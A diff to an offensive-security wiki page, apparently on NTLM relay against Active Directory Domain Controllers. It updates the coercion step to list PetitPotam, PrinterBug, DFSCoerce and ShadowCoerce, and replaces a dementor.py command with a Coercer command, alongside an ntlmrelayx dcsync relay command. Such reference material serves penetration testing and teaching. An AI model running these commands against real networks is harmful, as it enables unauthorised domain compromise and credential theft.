@@ -31,10 +31,10 @@ In order to operate the attack, the [Impacket](https://github.com/SecureAuthCorp
 ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
 ```
 
-Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). One way of doing this is to rely on the [PrinterBug](/ad/movement/mitm-and-coerced-authentications/ms-rprn).
+Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). This can be done with any coercion technique, e.g. [PetitPotam (MS-EFSR)](/ad/movement/mitm-and-coerced-authentications/ms-efsr), [PrinterBug (MS-RPRN)](/ad/movement/mitm-and-coerced-authentications/ms-rprn), [DFSCoerce (MS-DFSNM)](/ad/movement/mitm-and-coerced-authentications/ms-dfsnm) or [ShadowCoerce (MS-FSRVP)](/ad/movement/mitm-and-coerced-authentications/ms-fsrvp), conveniently wrapped by [Coercer](https://github.com/p0dalirius/Coercer).
 
 ```bash
-dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
+coercer coerce -u $user -p $password -d $domain -l $attacker_ip -t $domain_controller_1
 ```
 
 ### Password change ( :warning: disruptive)
